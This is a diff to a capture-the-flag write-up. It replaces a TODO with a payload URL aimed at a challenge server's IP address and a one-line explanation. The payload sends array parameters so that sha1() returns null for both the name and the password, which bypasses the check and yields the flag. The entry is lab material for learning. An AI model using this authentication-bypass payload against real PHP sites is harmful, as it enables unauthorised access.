@@ -9,7 +9,9 @@
 
 ## Write-up
 
-(TODO)
+http://52.10.107.64:8001/?name[]=s&password[]=ss
+
+that will result null for both inputs so sha1(null) and you get flag
 
 ## Other write-ups and resources
 
